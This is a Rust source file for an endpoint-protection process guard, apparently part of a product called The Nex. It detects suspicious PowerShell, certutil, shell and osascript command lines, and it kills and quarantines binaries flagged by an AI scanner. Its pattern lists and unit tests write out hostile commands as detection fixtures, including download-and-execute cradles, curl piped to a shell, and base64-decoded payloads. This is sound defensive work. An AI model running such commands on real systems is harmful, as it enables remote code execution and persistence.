use crate::ai_policy::{self, Action, Request, Target};
use crate::bin_ai::{self, BinaryAiScanner};
use crate::config::{AppConfig, Engine};
use crate::logger;
use crate::platform;
use crate::quarantine::{self, Severity, ThreatEvent};
use crate::status::Telemetry;
use std::collections::{HashMap, HashSet, VecDeque};
use std::ffi::OsStr;
use std::fs;
use std::panic::{self, AssertUnwindSafe};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};
use sysinfo::{Pid, Process, ProcessRefreshKind, ProcessesToUpdate, System, UpdateKind};

const POLL_INTERVAL: Duration = Duration::from_millis(400);
const EXIT_WAIT_ROUNDS: u32 = 15;
const EXIT_WAIT_STEP: Duration = Duration::from_millis(200);
const MAX_TRUST_CACHE: usize = 8192;
const CMDLINE_LOG_LIMIT: usize = 512;
/// AI scans per poll stop after this long; the rest wait for the next poll, so command-line
/// (LotL) checks of new processes are never held up by binary analysis.
const AI_SCAN_BUDGET: Duration = Duration::from_millis(250);
const MAX_PENDING_AI: usize = 4096;
pub const LOTL_PROCESSES: &[&str] = &[
    "powershell.exe",
    "pwsh.exe",
    "cmd.exe",
    "wscript.exe",
    "cscript.exe",
    "mshta.exe",
    "certutil.exe",
];

pub const LOTL_PATTERNS: &[&str] = &[
    "-enc ",
    "-ec ",
    "-encodedcommand",
    "invoke-expression",
    "iex ",
    "iex(",
    "downloadstring",
    "frombase64string",
    "-w hidden",
    "-windowstyle hidden",
    "-ep bypass",
    "certutil -urlcache",
];

/// Returns the first suspicious pattern for a script host, matching case- and
/// whitespace-insensitively with quote/caret obfuscation stripped.
pub fn match_lotl(process_name: &str, cmdline: &str) -> Option<&'static str> {
    let name = process_name.to_ascii_lowercase();
    if !LOTL_PROCESSES.contains(&name.as_str()) {
        return None;
    }
    let stripped: String = cmdline.chars().filter(|c| *c != '"' && *c != '^').collect();
    let mut normalized = stripped
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
        .to_lowercase()
        .replace("certutil.exe ", "certutil ");
    normalized.push(' ');
    LOTL_PATTERNS
        .iter()
        .copied()
        .find(|pattern| normalized.contains(pattern))
}

pub const MACOS_LOTL_PROCESSES: &[&str] = &["zsh", "bash", "sh", "osascript", "curl", "python3"];

pub const MACOS_LOTL_PATTERNS: &[&str] = &[
    "base64 -d",
    "base64 --decode",
    "b64decode",
    "osascript -e",
    "launchctl load",
    "chmod +x /tmp/",
    "chmod +x /private/tmp/",
];

pub const CURL_PIPE_SHELL: &str = "curl | sh";

/// `curl ... | [sudo] sh|bash|zsh` within one command line (download-and-execute).
fn curl_piped_to_shell(normalized: &str) -> bool {
    let stages: Vec<&str> = normalized.split(" | ").collect();
    let is_fetcher = |token: &str| {
        let tool = token.rsplit('/').next().unwrap_or(token);
        tool == "curl" || tool == "wget"
    };
    let Some(first_fetch) = stages
        .iter()
        .position(|stage| stage.split(' ').any(is_fetcher))
    else {
        return false;
    };
    stages[first_fetch + 1..].iter().any(|stage| {
        let mut tokens = stage.split(' ').filter(|t| !t.is_empty());
        let mut command = tokens.next();
        if command == Some("sudo") {
            command = tokens.next();
        }
        command
            .map(|c| c.rsplit('/').next().unwrap_or(c))
            .is_some_and(|c| matches!(c, "sh" | "bash" | "zsh"))
    })
}

/// macOS counterpart of [`match_lotl`]: shells, osascript, curl and python3 (any 3.x name).
pub fn match_lotl_macos(process_name: &str, cmdline: &str) -> Option<&'static str> {
    let name = process_name.to_lowercase();
    let is_python = name == "python" || name.starts_with("python3");
    if !is_python && !MACOS_LOTL_PROCESSES.contains(&name.as_str()) {
        return None;
    }
    let unquoted: String = cmdline
        .chars()
        .filter(|c| *c != '"' && *c != '\'')
        .collect::<String>()
        .replace('|', " | ");
    let normalized = unquoted
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
        .to_lowercase();
    if curl_piped_to_shell(&normalized) {
        return Some(CURL_PIPE_SHELL);
    }
    MACOS_LOTL_PATTERNS
        .iter()
        .copied()
        .find(|pattern| normalized.contains(pattern))
}

/// Both rule sets: Windows script hosts and macOS shells/interpreters have disjoint names.
pub fn check_lotl_command(proc_name: &str, cmdline: &str) -> Option<&'static str> {
    match_lotl(proc_name, cmdline).or_else(|| match_lotl_macos(proc_name, cmdline))
}

fn refresh_kind() -> ProcessRefreshKind {
    ProcessRefreshKind::nothing()
        .with_cmd(UpdateKind::OnlyIfNotSet)
        .with_exe(UpdateKind::OnlyIfNotSet)
        .with_disk_usage()
}

fn process_name(process: &Process) -> String {
    OsStr::new(process.name()).to_string_lossy().into_owned()
}

fn command_line(process: &Process) -> String {
    process
        .cmd()
        .iter()
        .map(|arg| OsStr::new(arg).to_string_lossy().into_owned())
        .collect::<Vec<_>>()
        .join(" ")
}

/// Protection by name alone is spoofable (malware can call itself "dock" or "explorer.exe"), so
/// a name on the allowlist only protects a process whose image is at an OS-critical path or
/// validly signed. With no readable image path only pid 0/1/4 and ourselves are protected (a
/// self-deleting binary must not hide behind a protected name).
/// `signed` is only evaluated for a listed name outside the critical roots.
fn is_protected(
    pid: u32,
    name: &str,
    exe: Option<&Path>,
    signed: impl FnOnce(&Path) -> bool,
) -> bool {
    if matches!(pid, 0 | 1 | 4) || pid == std::process::id() {
        return true;
    }
    if !platform::is_protected_process(pid, name) {
        return false;
    }
    exe.is_some_and(|exe| ai_policy::is_os_critical_path(exe) || signed(exe))
}

pub struct ProcessGuard {
    cfg: Arc<AppConfig>,
    scanner: Arc<BinaryAiScanner>,
    telemetry: Arc<Telemetry>,
    sys: System,
    /// pid -> start time, so a recycled PID is treated as a new process.
    seen: HashMap<Pid, u64>,
    trust_cache: HashMap<PathBuf, (bin_ai::FileStamp, bool)>,
    /// (pid, start time) of everything running when protection started; never killed by the AI.
    baseline: HashSet<(Pid, u64)>,
    /// (pid, was already running when protection started) waiting for a binary AI scan.
    pending_ai: VecDeque<(Pid, bool)>,
    /// The Nex itself and the chain that launched it (shell, terminal, service manager).
    ancestors: HashSet<Pid>,
    primed: bool,
}

impl ProcessGuard {
    pub fn new(
        cfg: Arc<AppConfig>,
        scanner: Arc<BinaryAiScanner>,
        telemetry: Arc<Telemetry>,
    ) -> Self {
        Self {
            cfg,
            scanner,
            telemetry,
            sys: System::new(),
            seen: HashMap::new(),
            trust_cache: HashMap::new(),
            baseline: HashSet::new(),
            pending_ai: VecDeque::new(),
            ancestors: HashSet::new(),
            primed: false,
        }
    }

    fn ancestor_pids(&self) -> HashSet<Pid> {
        let mut out = HashSet::new();
        let mut current = Some(Pid::from_u32(std::process::id()));
        while let Some(pid) = current {
            if !out.insert(pid) {
                break;
            }
            current = self.sys.process(pid).and_then(|p| p.parent());
        }
        out
    }

    pub fn poll(&mut self) {
        if !self.cfg.engine_enabled(Engine::ProcessGuard) {
            // Forget everything so re-enabling inspects what is running at that moment.
            self.seen.clear();
            self.pending_ai.clear();
            self.primed = false;
            self.baseline.clear();
            self.telemetry.processes_watched.store(0, Ordering::Relaxed);
            return;
        }
        let first_poll = !self.primed;
        self.sys
            .refresh_processes_specifics(ProcessesToUpdate::All, true, refresh_kind());
        let mut fresh = Vec::new();
        for (pid, process) in self.sys.processes() {
            let started = process.start_time();
            if self.seen.get(pid) != Some(&started) {
                self.seen.insert(*pid, started);
                fresh.push(*pid);
            }
        }
        let live = self.sys.processes();
        self.seen.retain(|pid, _| live.contains_key(pid));
        self.telemetry
            .processes_watched
            .store(live.len() as u64, Ordering::Relaxed);
        self.telemetry
            .processes_inspected
            .fetch_add(fresh.len() as u64, Ordering::Relaxed);
        if first_poll {
            self.ancestors = self.ancestor_pids();
            self.baseline = self
                .sys
                .processes()
                .iter()
                .map(|(pid, p)| (*pid, p.start_time()))
                .collect();
            self.primed = true;
        }
        // Cheap command-line checks first, for every new process, so a malicious script host
        // is stopped within one poll; binary scans follow within a time budget.
        for pid in fresh {
            if self.ancestors.contains(&pid) {
                continue;
            }
            if !self.inspect_command(pid) {
                self.pending_ai.push_back((pid, first_poll));
            }
        }
        while self.pending_ai.len() > MAX_PENDING_AI {
            self.pending_ai.pop_front();
        }
        let started = Instant::now();
        while started.elapsed() < AI_SCAN_BUDGET {
            let Some((pid, preexisting)) = self.pending_ai.pop_front() else {
                break;
            };
            self.inspect_binary(pid, preexisting);
        }
    }

    /// LotL command-line check. True when the process needs nothing more (handled, protected
    /// or gone).
    fn inspect_command(&mut self, pid: Pid) -> bool {
        let Some(process) = self.sys.process(pid) else {
            return true;
        };
        let name = process_name(process);
        let exe = process.exe().map(Path::to_path_buf);
        if is_protected(pid.as_u32(), &name, exe.as_deref(), |e| self.is_trusted(e)) {
            return true;
        }
        let Some(process) = self.sys.process(pid) else {
            return true;
        };
        let cmdline = command_line(process);
        if let Some(pattern) = check_lotl_command(&name, &cmdline) {
            self.respond_lotl(pid, &name, &cmdline, pattern);
            return true;
        }
        false
    }

    fn inspect_binary(&mut self, pid: Pid, preexisting: bool) {
        if !self.cfg.engine_enabled(Engine::BinAi) {
            return;
        }
        let Some(process) = self.sys.process(pid) else {
            return;
        };
        let name = process_name(process);
        let Some(exe) = process.exe().map(Path::to_path_buf) else {
            return;
        };
        self.scan_executable(pid, &name, &exe, preexisting);
    }

    fn respond_lotl(&mut self, pid: Pid, name: &str, cmdline: &str, pattern: &str) {
        let action = if self.cfg.is_dry_run() {
            "DRY_RUN: would terminate process".to_string()
        } else if self.sys.process(pid).is_some_and(|p| p.kill()) {
            "TERMINATED".to_string()
        } else {
            "TERMINATE_FAILED".to_string()
        };
        quarantine::record_event(
            &self.cfg,
            ThreatEvent::new(
                "LOTL_SCRIPT",
                Severity::High,
                format!("{name} (pid {})", pid.as_u32()),
                action,
                format!(
                    "pattern=\"{}\" cmdline=\"{}\"",
                    pattern.trim(),
                    quarantine::truncate_chars(cmdline, CMDLINE_LOG_LIMIT)
                ),
            ),
        );
    }

    fn is_trusted(&mut self, exe: &Path) -> bool {
        let Some(stamp) = fs::metadata(exe).ok().and_then(|m| bin_ai::file_stamp(&m)) else {
            return platform::is_trusted_binary(exe); // no tamper-resistant stamp: never cache
        };
        if let Some(&(cached, trusted)) = self.trust_cache.get(exe) {
            if cached == stamp {
                return trusted;
            }
        }
        let trusted = platform::is_trusted_binary(exe);
        if self.trust_cache.len() >= MAX_TRUST_CACHE {
            self.trust_cache.clear();
        }
        self.trust_cache.insert(exe.to_path_buf(), (stamp, trusted));
        trusted
    }

    fn scan_executable(&mut self, pid: Pid, name: &str, exe: &Path, preexisting: bool) {
        if !crate::engine::is_regular_file(exe) || self.is_trusted(exe) {
            return;
        }
        let Some(score) = self.scanner.scan_file(exe) else {
            return;
        };
        let threshold = ai_policy::effective_threshold(self.cfg.ai_threshold);
        if score.is_nan() || score < threshold {
            return;
        }
        let details = format!(
            "pid={} name={name} {}",
            pid.as_u32(),
            self.scanner.explain(exe, score, threshold)
        );
        let decision = ai_policy::decide(&Request {
            path: exe,
            score,
            threshold: self.cfg.ai_threshold,
            trusted: false,
            dry_run: self.cfg.is_dry_run(),
            target: Target::Process { preexisting },
            explanation: &details,
            data_dir: &self.cfg.base_dir,
        });
        let (severity, action) = match decision {
            Action::Ignore => return,
            Action::Alert(why) => (Severity::High, format!("ALERT_ONLY: {why}")),
            Action::WouldTerminateAndQuarantine | Action::WouldQuarantine => (
                Severity::Critical,
                "DRY_RUN: would terminate process and quarantine executable".to_string(),
            ),
            Action::Quarantine | Action::TerminateAndQuarantine => {
                let killed = self.kill_all_with_exe(exe);
                self.wait_for_exit(&killed);
                let quarantined = match quarantine::quarantine_file(
                    exe,
                    &self.cfg,
                    "MALWARE_AI_PROCESS",
                    &details,
                ) {
                    Ok(meta) => format!("QUARANTINED id={}", meta.id),
                    Err(e) => format!("QUARANTINE_FAILED: {e}"),
                };
                (
                    Severity::Critical,
                    format!("TERMINATED {} process(es); {quarantined}", killed.len()),
                )
            }
        };
        quarantine::record_event(
            &self.cfg,
            ThreatEvent::new(
                "MALWARE_AI_PROCESS",
                severity,
                exe.display().to_string(),
                action,
                details,
            ),
        );
    }

    fn kill_all_with_exe(&mut self, exe: &Path) -> Vec<Pid> {
        let target = platform::path_key(exe);
        let candidates: Vec<(Pid, u64)> = self
            .sys
            .processes()
            .iter()
            .filter(|(pid, process)| {
                process
                    .exe()
                    .is_some_and(|candidate| platform::path_key(candidate) == target)
                    && !self.ancestors.contains(pid)
                    && !self.baseline.contains(&(**pid, process.start_time()))
                    && !is_protected(pid.as_u32(), &process_name(process), process.exe(), |_| {
                        false
                    })
            })
            .map(|(pid, process)| (*pid, process.start_time()))
            .collect();
        let mut killed = Vec::new();
        for (pid, started) in candidates {
            // The list may be stale: re-read this pid and kill only the same process instance
            // (a recycled PID has a different start time).
            self.sys
                .refresh_processes(ProcessesToUpdate::Some(&[pid]), true);
            if self
                .sys
                .process(pid)
                .is_some_and(|p| p.start_time() == started && p.kill())
            {
                killed.push(pid);
            }
        }
        killed
    }

    fn wait_for_exit(&mut self, pids: &[Pid]) {
        if pids.is_empty() {
            return;
        }
        for _ in 0..EXIT_WAIT_ROUNDS {
            self.sys
                .refresh_processes(ProcessesToUpdate::Some(pids), true);
            if pids.iter().all(|pid| self.sys.process(*pid).is_none()) {
                return;
            }
            thread::sleep(EXIT_WAIT_STEP);
        }
    }
}

pub fn run(
    cfg: Arc<AppConfig>,
    scanner: Arc<BinaryAiScanner>,
    telemetry: Arc<Telemetry>,
    shutdown: Arc<AtomicBool>,
) {
    let mut guard = ProcessGuard::new(cfg, scanner, telemetry);
    logger::info("process guard active");
    while !shutdown.load(Ordering::SeqCst) {
        if panic::catch_unwind(AssertUnwindSafe(|| guard.poll())).is_err() {
            logger::error("process guard recovered from a panic");
        }
        thread::sleep(POLL_INTERVAL);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn protected_names_do_not_protect_look_alikes() {
        let me = std::process::id();
        // Named like a system process but running from a user folder and unsigned.
        assert!(!is_protected(
            me + 1,
            "explorer.exe",
            Some(Path::new("C:\\Users\\x\\explorer.exe")),
            |_| false
        ));
        assert!(!is_protected(
            me + 1,
            "dock",
            Some(Path::new("/tmp/dock")),
            |_| false
        ));
        // The real thing, or a validly signed one, stays protected.
        assert!(is_protected(
            me + 1,
            "dock",
            Some(Path::new(
                "/System/Library/CoreServices/Dock.app/Contents/MacOS/Dock"
            )),
            |_| false
        ));
        assert!(is_protected(
            me + 1,
            "dock",
            Some(Path::new("/tmp/dock")),
            |_| true
        ));
        // Kernel tasks with no image path, and our own pid, keep protection.
        assert!(!is_protected(me + 1, "kernel_task", None, |_| false)); // no path: no name protection
        assert!(is_protected(1, "kernel_task", None, |_| false));
        assert!(is_protected(me, "anything", None, |_| false));
        assert!(!is_protected(me + 1, "random", None, |_| true));
    }

    #[test]
    fn flags_encoded_and_download_cradles() {
        assert_eq!(
            match_lotl("powershell.exe", "powershell.exe -NoP -Enc SQBFAFgA"),
            Some("-enc ")
        );
        assert_eq!(
            match_lotl("PowerShell.EXE", "powershell -EncodedCommand ZQBjAGgAbwA="),
            Some("-encodedcommand")
        );
        assert!(match_lotl(
            "pwsh.exe",
            "pwsh -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')\""
        )
        .is_some());
        assert!(match_lotl("powershell.exe", "powershell -W Hidden -File x.ps1").is_some());
        assert!(match_lotl("powershell.exe", "powershell -ep   bypass -f a.ps1").is_some());
        assert!(match_lotl(
            "powershell.exe",
            "powershell [Convert]::FromBase64String($s)"
        )
        .is_some());
        assert!(match_lotl("powershell.exe", "powershell -c iex").is_some());
    }

    #[test]
    fn flags_cmd_and_certutil_variants() {
        assert_eq!(
            match_lotl(
                "cmd.exe",
                "cmd /c c^e^r^t^u^t^i^l -urlcache -split -f http://x/a.exe"
            ),
            Some("certutil -urlcache")
        );
        assert_eq!(
            match_lotl(
                "certutil.exe",
                "\"C:\\Windows\\System32\\certutil.exe\" -urlcache -f http://x/p a.exe"
            ),
            Some("certutil -urlcache")
        );
        assert!(match_lotl("mshta.exe", "mshta vbscript:Execute(\"x\") -w hidden").is_some());
    }

    #[test]
    fn ignores_benign_commands_and_other_processes() {
        assert_eq!(
            match_lotl("powershell.exe", "powershell -NoProfile -File build.ps1"),
            None
        );
        assert_eq!(match_lotl("cmd.exe", "cmd /c npm run build"), None);
        assert_eq!(
            match_lotl("powershell.exe", "powershell Get-ChildItem -Recurse"),
            None
        );
        assert_eq!(match_lotl("notepad.exe", "notepad -enc x"), None);
        assert_eq!(match_lotl("code.exe", "code --windowstyle hidden"), None);
    }

    #[test]
    fn macos_flags_download_and_decode_stagers() {
        assert_eq!(
            match_lotl_macos("bash", "bash -c 'curl -fsSL http://x/p.sh | sh'"),
            Some(CURL_PIPE_SHELL)
        );
        assert_eq!(
            match_lotl_macos("zsh", "zsh -c curl -s http://x|sudo /bin/bash"),
            Some(CURL_PIPE_SHELL)
        );
        assert_eq!(
            match_lotl_macos("sh", "sh -c echo ZWNobyBoaQ== | base64 -D | sh"),
            Some("base64 -d")
        );
        assert_eq!(
            match_lotl_macos("osascript", "osascript -e do shell script \"id\""),
            Some("osascript -e")
        );
        assert_eq!(
            match_lotl_macos(
                "bash",
                "bash -c launchctl load ~/Library/LaunchAgents/x.plist"
            ),
            Some("launchctl load")
        );
        assert_eq!(
            match_lotl_macos("sh", "sh -c chmod +x /tmp/payload && /tmp/payload"),
            Some("chmod +x /tmp/")
        );
        assert_eq!(
            match_lotl_macos(
                "Python3.12",
                "python3 -c import base64;exec(base64.b64decode('aW1wb3J0IG9z'))"
            ),
            Some("b64decode")
        );
    }

    #[test]
    fn macos_ignores_benign_commands_and_other_processes() {
        assert_eq!(match_lotl_macos("zsh", "zsh -c ls -la | grep foo"), None);
        assert_eq!(
            match_lotl_macos(
                "curl",
                "curl -fsSL -o setup.pkg https://example.com/setup.pkg"
            ),
            None
        );
        assert_eq!(
            match_lotl_macos(
                "bash",
                "bash -c curl -s https://x/sums.txt | shasum -a 256 -c"
            ),
            None
        );
        assert_eq!(
            match_lotl_macos(
                "osascript",
                "osascript - The Nex: ZIP_BOMB (HIGH) /tmp/a.zip"
            ),
            None
        );
        assert_eq!(match_lotl_macos("Safari", "Safari -e x"), None);
        assert_eq!(
            match_lotl_macos("powershell.exe", "powershell -enc x"),
            None
        );
        assert_eq!(match_lotl("zsh", "zsh -c curl x | sh"), None);
    }

    #[test]
    fn unified_matcher_covers_both_platforms() {
        for (name, cmdline) in [
            ("powershell.exe", "powershell.exe -w hidden -enc SQBFAFgA"),
            ("powershell.exe", "powershell -ep bypass iex (iwr http://x)"),
            (
                "certutil.exe",
                "certutil -urlcache -split -f http://x/a.exe",
            ),
            ("sh", "sh -c \"curl http://x | sh\""),
            ("osascript", "osascript -e 'do shell script \"id\"'"),
            ("bash", "bash -c echo aWQ= | base64 -D"),
        ] {
            assert!(
                check_lotl_command(name, cmdline).is_some(),
                "{name}: {cmdline}"
            );
        }
        for (name, cmdline) in [
            ("powershell.exe", "powershell.exe -Command Get-Date"),
            ("git.exe", "git status"),
            ("git", "git status"),
            ("cargo.exe", "cargo build"),
            ("zsh", "zsh -c cargo build"),
        ] {
            assert_eq!(check_lotl_command(name, cmdline), None, "{name}: {cmdline}");
        }
    }

    #[cfg(unix)]
    #[test]
    fn kill_all_with_exe_spares_preexisting_instances() {
        use std::process::Command;
        let dir = std::env::temp_dir().join(format!("thenex-pg-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        let exe = dir.join("napper");
        fs::copy("/bin/sleep", &exe).unwrap();
        let mut old = Command::new(&exe).arg("30").spawn().unwrap();
        let mut new = Command::new(&exe).arg("30").spawn().unwrap();
        let cfg = Arc::new(AppConfig::for_base_dir(&dir.join("base")));
        let mut g = ProcessGuard::new(
            cfg,
            Arc::new(BinaryAiScanner::heuristic_only()),
            Arc::new(Telemetry::default()),
        );
        g.sys
            .refresh_processes_specifics(ProcessesToUpdate::All, true, refresh_kind());
        let old_pid = Pid::from_u32(old.id());
        let started = g.sys.process(old_pid).unwrap().start_time();
        g.baseline.insert((old_pid, started));
        let canon = fs::canonicalize(&exe).unwrap();
        let killed = g.kill_all_with_exe(&canon);
        assert_eq!(killed, vec![Pid::from_u32(new.id())]);
        assert!(new.wait().is_ok());
        assert!(
            old.try_wait().unwrap().is_none(),
            "preexisting must survive"
        );
        let _ = old.kill();
        let _ = old.wait();
        let _ = fs::remove_dir_all(&dir);
    }
}
